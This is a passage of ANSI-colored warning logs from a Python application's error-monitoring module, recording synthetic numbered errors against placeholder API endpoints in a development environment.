WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725634Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 778'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 779'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725733Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 780'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725784Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 781'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 782'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725885Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 783'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725933Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 784'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725982Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 785'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726086Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 786'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 787'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726243Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 788'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 789'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 790'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 791'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726495Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 792'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 793'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 794'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726642Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 795'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726691Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 796'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726740Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 797'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 798'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726838Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 799'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726886Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 800'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726935Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 801'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.726983Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 802'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 803'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727083Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 804'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 805'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 806'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 807'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 808'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 809'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 810'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727508Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 811'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727556Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 812'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 813'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727661Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 814'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727714Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 815'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 816'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.727868Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m17[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 817'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
